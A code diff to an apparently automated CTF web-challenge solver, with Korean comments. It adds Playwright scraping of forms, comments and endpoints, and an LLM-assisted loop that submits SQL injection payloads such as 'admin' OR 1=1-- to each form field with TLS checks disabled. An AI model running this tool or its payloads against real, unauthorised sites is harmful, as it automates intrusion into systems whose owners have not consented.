@@ -1,13 +1,27 @@
 """
-Web Solver - CTF 웹 취약점 자동 풀이
+Web Solver - CTF 웹 취약점 자동 풀이 (Playwright 기반 페이지 분석)
 """
 
 import asyncio
-from typing import Dict, List, Optional
+import re
+from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 
 from .llm_reasoner import LLMReasoner, CTFAnalysis
 from .tool_executor import ToolExecutor, ToolResult
+
+
+@dataclass
+class PageAnalysis:
+    """페이지 분석 결과"""
+    html: str
+    forms: List[Dict[str, Any]]
+    scripts: List[str]
+    comments: List[str]
+    visible_text: str
+    cookies: Dict[str, str]
+    headers: Dict[str, str]
+    endpoints: List[str]
 
 
 @dataclass
@@ -30,7 +44,7 @@ class WebSolver:
 
     async def solve(self, url: str, challenge_info: Dict) -> Dict:
         """
-        웹 취약점 자동 풀이
+        웹 취약점 자동 풀이 (페이지 분석 기반)
 
         Args:
             url: 대상 URL
@@ -39,12 +53,31 @@ class WebSolver:
         Returns:
             풀이 결과
         """
-        # 1. LLM으로 문제 분석
+        print(f"  🌐 페이지 분석 중: {url}")
+
+        # 1. Playwright로 페이지 실제 분석
+        page_analysis = await self._fetch_and_analyze_page(url)
+
+        if not page_analysis:
+            print("  ⚠️  페이지 분석 실패, 기본 분석으로 진행")
+            page_analysis = PageAnalysis(
+                html='', forms=[], scripts=[], comments=[],
+                visible_text='', cookies={}, headers={}, endpoints=[]
+            )
+
+        # 2. LLM으로 문제 분석 (실제 페이지 내용 포함)
+        print("  🤖 LLM 분석 중...")
         analysis = await self.llm.analyze_challenge({
             'title': challenge_info.get('title', ''),
             'description': challenge_info.get('description', ''),
             'url': url,
-            'hints': challenge_info.get('hints', [])
+            'hints': challenge_info.get('hints', []),
+            # ✅ 실제 페이지 내용 추가
+            'html_snippet': page_analysis.html[:2000],  # 앞부분만
+            'forms': page_analysis.forms,
+            'comments': page_analysis.comments,
+            'visible_text': page_analysis.visible_text[:1000],
+            'endpoints': page_analysis.endpoints
         })
 
         if analysis.category != 'web':
@@ -53,24 +86,25 @@ class WebSolver:
                 'error': f'Not a web challenge: {analysis.category}'
             }
 
-        # 2. 취약점 유형별 처리
+        print(f"  🎯 취약점 유형: {analysis.vulnerability_type}")
+
+        # 3. 취약점 유형별 처리 (페이지 분석 정보 전달)
         vuln_type = analysis.vulnerability_type.lower()
 
         if 'sql injection' in vuln_type or 'sqli' in vuln_type:
-            result = await self._solve_sqli(url, analysis)
+            result = await self._solve_sqli(url, analysis, page_analysis)
         elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
-            result = await self._solve_xss(url, analysis)
+            result = await self._solve_xss(url, analysis, page_analysis)
         elif 'lfi' in vuln_type or 'local file inclusion' in vuln_type:
-            result = await self._solve_lfi(url, analysis)
+            result = await self._solve_lfi(url, analysis, page_analysis)
         elif 'rfi' in vuln_type or 'remote file inclusion' in vuln_type:
-            result = await self._solve_rfi(url, analysis)
+            result = await self._solve_rfi(url, analysis, page_analysis)
         elif 'command injection' in vuln_type or 'rce' in vuln_type:
-            result = await self._solve_command_injection(url, analysis)
+            result = await self._solve_command_injection(url, analysis, page_analysis)
         elif 'ssrf' in vuln_type:
-            result = await self._solve_ssrf(url, analysis)
+            result = await self._solve_ssrf(url, analysis, page_analysis)
         else:
-            # 알 수 없는 유형 → LLM에게 exploit 생성 요청
-            result = await self._generic_web_exploit(url, analysis)
+            result = await self._generic_web_exploit(url, analysis, page_analysis)
 
         return {
             'success': result.success,
@@ -78,77 +112,209 @@ class WebSolver:
             'vulnerability_type': result.vulnerability_type,
             'payload': result.payload,
             'confidence': result.confidence,
-            'analysis': analysis
+            'analysis': analysis,
+            'page_analysis': {
+                'forms': len(page_analysis.forms),
+                'scripts': len(page_analysis.scripts),
+                'comments': len(page_analysis.comments)
+            }
         }
+
+    async def _fetch_and_analyze_page(self, url: str) -> Optional[PageAnalysis]:
+        """
+        Playwright로 페이지 실제 분석
+
+        Returns:
+            PageAnalysis 또는 None (실패 시)
+        """
+        try:
+            from playwright.async_api import async_playwright
+        except ImportError:
+            print("  ⚠️  Playwright가 설치되지 않음 (pip install playwright)")
+            return None
+
+        try:
+            async with async_playwright() as p:
+                browser = await p.chromium.launch(headless=True)
+                context = await browser.new_context(
+                    ignore_https_errors=True,
+                    user_agent='Mozilla/5.0 CTF Bot'
+                )
+                page = await context.new_page()
+
+                # 페이지 로드
+                await page.goto(url, wait_until='networkidle', timeout=15000)
+
+                # HTML 가져오기
+                html = await page.content()
+
+                # Form 구조 추출
+                forms = await page.evaluate('''() => {
+                    return Array.from(document.forms).map(form => ({
+                        action: form.action,
+                        method: form.method.toUpperCase(),
+                        fields: Array.from(form.elements).filter(el => el.name).map(el => ({
+                            name: el.name,
+                            type: el.type || 'text',
+                            value: el.value || '',
+                            required: el.required || false
+                        }))
+                    }))
+                }''')
+
+                # JavaScript 파일/코드 추출
+                scripts = await page.evaluate('''() => {
+                    return Array.from(document.scripts).map(s =>
+                        s.src || s.textContent.substring(0, 500)
+                    ).filter(s => s.trim())
+                }''')
+
+                # HTML 주석 추출
+                comments = await page.evaluate('''() => {
+                    const walker = document.createTreeWalker(
+                        document.documentElement,
+                        NodeFilter.SHOW_COMMENT
+                    );
+                    const comments = [];
+                    while (walker.nextNode()) {
+                        comments.push(walker.currentNode.textContent.trim());
+                    }
+                    return comments;
+                }''')
+
+                # 보이는 텍스트
+                visible_text = await page.inner_text('body')
+
+                # 쿠키
+                cookies = {c['name']: c['value'] for c in await context.cookies()}
+
+                # 헤더 (응답)
+                response = await page.goto(url)
+                headers = dict(response.headers) if response else {}
+
+                # API 엔드포인트 추출 (a 태그, fetch 호출 등)
+                endpoints = await page.evaluate('''() => {
+                    const urls = new Set();
+                    // a 태그
+                    document.querySelectorAll('a[href]').forEach(a => {
+                        try {
+                            const url = new URL(a.href, window.location.origin);
+                            if (url.pathname !== '/') urls.add(url.pathname);
+                        } catch (e) {}
+                    });
+                    // form action
+                    document.querySelectorAll('form[action]').forEach(f => {
+                        try {
+                            const url = new URL(f.action, window.location.origin);
+                            urls.add(url.pathname);
+                        } catch (e) {}
+                    });
+                    return Array.from(urls);
+                }''')
+
+                await browser.close()
+
+                print(f"  ✅ 페이지 분석 완료: {len(forms)} forms, {len(comments)} comments")
+
+                return PageAnalysis(
+                    html=html,
+                    forms=forms,
+                    scripts=scripts[:10],  # 최대 10개
+                    comments=comments,
+                    visible_text=visible_text,
+                    cookies=cookies,
+                    headers=headers,
+                    endpoints=endpoints
+                )
+
+        except Exception as e:
+            print(f"  ❌ 페이지 분석 실패: {e}")
+            return None
 
     # === SQL Injection ===
 
-    async def _solve_sqli(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
-        """SQL Injection 자동 풀이"""
+    async def _solve_sqli(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
+        """SQL Injection 자동 풀이 (타겟팅)"""
         print(f"  🔍 SQL Injection 탐지 시도: {url}")
 
-        # SQLMap 자동 실행
-        sqlmap_result = await self.executor.run_sqlmap(
-            url,
-            options=['--batch', '--level=3', '--risk=2', '--threads=5']
-        )
+        # ✅ 페이지 분석에서 form 정보 추출
+        target_forms = page_analysis.forms
+        if not target_forms:
+            print("  ⚠️  Form이 없음, URL 파라미터 타겟팅")
+            target_forms = [{'action': url, 'method': 'GET', 'fields': [{'name': 'id', 'type': 'text'}]}]
 
-        if sqlmap_result.success:
-            # SQLMap 결과에서 플래그 추출
-            flag = self._extract_flag(sqlmap_result.output)
+        for form in target_forms:
+            print(f"  📝 Form 분석: {form['action']} ({form['method']})")
+            print(f"     필드: {[f['name'] for f in form['fields']]}")
 
-            if flag:
-                return WebExploitResult(
-                    vulnerability_type='SQL Injection',
-                    success=True,
-                    flag=flag,
-                    payload='SQLMap automated',
-                    response=sqlmap_result.output[:1000],
-                    confidence=0.95
+            # 각 필드에 SQL Injection 시도
+            for field in form['fields']:
+                field_name = field['name']
+                print(f"  🎯 타겟 필드: {field_name}")
+
+                # 기본 SQL Injection 페이로드
+                sqli_payloads = [
+                    "admin' OR 1=1--",
+                    "admin' OR '1'='1",
+                    "' OR 1=1--",
+                    "' OR '1'='1'--",
+                    "1' UNION SELECT NULL--",
+                    "admin'--",
+                ]
+
+                # LLM에게 추가 페이로드 요청 (페이지 정보 포함)
+                exploit_code = await self.llm.generate_exploit(
+                    analysis,
+                    context=f"""
+Form: {form['action']} ({form['method']})
+Target field: {field_name}
+HTML comments: {page_analysis.comments}
+Visible text: {page_analysis.visible_text[:500]}
+
+Generate SQL injection payloads for this specific field.
+                    """.strip()
                 )
 
-        # SQLMap 실패 → LLM으로 수동 페이로드 생성
-        print("  ⚠️  SQLMap 실패, LLM으로 수동 페이로드 생성")
+                llm_payloads = self._extract_payloads_from_llm(exploit_code)
+                all_payloads = llm_payloads + sqli_payloads
 
-        exploit_code = await self.llm.generate_exploit(
-            analysis,
-            context=f"SQLMap output:\n{sqlmap_result.output[:2000]}"
-        )
+                # 타겟팅된 공격 실행
+                for payload in all_payloads[:10]:
+                    # Form의 다른 필드도 채우기
+                    data = {f['name']: (payload if f['name'] == field_name else 'test')
+                            for f in form['fields']}
 
-        # LLM이 생성한 Python 코드 실행
-        try:
-            # 간단한 예제: LLM이 생성한 페이로드 추출
-            payloads = self._extract_payloads_from_llm(exploit_code)
-
-            for payload in payloads[:5]:  # 최대 5개 시도
-                # 실제 구현에서는 requests 라이브러리 사용
-                result = await self._test_payload(url, payload)
-
-                if result['success']:
-                    flag = self._extract_flag(result['response'])
-                    return WebExploitResult(
-                        vulnerability_type='SQL Injection (Manual)',
-                        success=True,
-                        flag=flag,
-                        payload=payload,
-                        response=result['response'][:1000],
-                        confidence=0.75
+                    result = await self._test_payload_advanced(
+                        url=form['action'],
+                        method=form['method'],
+                        data=data
                     )
-        except Exception as e:
-            print(f"  ❌ 수동 페이로드 실행 실패: {e}")
 
+                    if result['success']:
+                        flag = self._extract_flag(result['response'])
+                        if flag or 'admin' in result['response'].lower():
+                            return WebExploitResult(
+                                vulnerability_type='SQL Injection (Targeted)',
+                                success=True,
+                                flag=flag,
+                                payload=f"{field_name}={payload}",
+                                response=result['response'][:1000],
+                                confidence=0.9
+                            )
+
+        # 모든 시도 실패
         return WebExploitResult(
             vulnerability_type='SQL Injection',
             success=False,
             flag=None,
             payload='',
-            response='All attempts failed',
+            response='All targeted attempts failed',
             confidence=0.0
         )
 
     # === XSS ===
 
-    async def _solve_xss(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
+    async def _solve_xss(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
         """XSS 자동 풀이"""
         print(f"  🔍 XSS 탐지 시도: {url}")
 
@@ -196,7 +362,7 @@ class WebSolver:
 
     # === LFI/RFI ===
 
-    async def _solve_lfi(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
+    async def _solve_lfi(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
         """Local File Inclusion 자동 풀이"""
         print(f"  🔍 LFI 탐지 시도: {url}")
 
@@ -243,7 +409,7 @@ class WebSolver:
             confidence=0.0
         )
 
-    async def _solve_rfi(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
+    async def _solve_rfi(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
         """Remote File Inclusion 자동 풀이"""
         print(f"  🔍 RFI 탐지 시도: {url}")
 
@@ -264,7 +430,7 @@ class WebSolver:
 
     # === Command Injection ===
 
-    async def _solve_command_injection(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
+    async def _solve_command_injection(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
         """Command Injection 자동 풀이"""
         print(f"  🔍 Command Injection 탐지 시도: {url}")
 
@@ -315,7 +481,7 @@ class WebSolver:
 
     # === SSRF ===
 
-    async def _solve_ssrf(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
+    async def _solve_ssrf(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
         """SSRF 자동 풀이"""
         print(f"  🔍 SSRF 탐지 시도: {url}")
 
@@ -354,7 +520,7 @@ class WebSolver:
 
     # === Generic Web Exploit ===
 
-    async def _generic_web_exploit(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
+    async def _generic_web_exploit(self, url: str, analysis: CTFAnalysis, page_analysis: PageAnalysis) -> WebExploitResult:
         """알 수 없는 웹 취약점 → LLM에게 전체 풀이 요청"""
         print(f"  🤖 LLM 기반 일반 웹 공격 시도: {url}")
 
@@ -391,6 +557,47 @@ class WebSolver:
         )
 
     # === Helper Methods ===
+
+    async def _test_payload_advanced(self, url: str, method: str, data: Dict[str, str]) -> Dict:
+        """
+        고급 페이로드 테스트 (Form 데이터 전송)
+
+        Args:
+            url: 대상 URL
+            method: HTTP 메서드 (GET/POST)
+            data: 전송할 데이터 (dict)
+
+        Returns:
+            {'success': bool, 'response': str, 'status_code': int}
+        """
+        try:
+            import httpx
+
+            async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True) as client:
+                if method.upper() == 'GET':
+                    response = await client.get(url, params=data)
+                elif method.upper() == 'POST':
+                    response = await client.post(url, data=data)
+                else:
+                    return {
+                        'success': False,
+                        'response': '',
+                        'status_code': 0
+                    }
+
+                return {
+                    'success': response.status_code == 200,
+                    'response': response.text,
+                    'status_code': response.status_code
+                }
+
+        except Exception as e:
+            print(f"  ⚠️  HTTP 요청 실패: {e}")
+            return {
+                'success': False,
+                'response': '',
+                'status_code': 0
+            }
 
     async def _test_payload(self, url: str, payload: str, param: str = 'id', method: str = 'GET') -> Dict:
         """
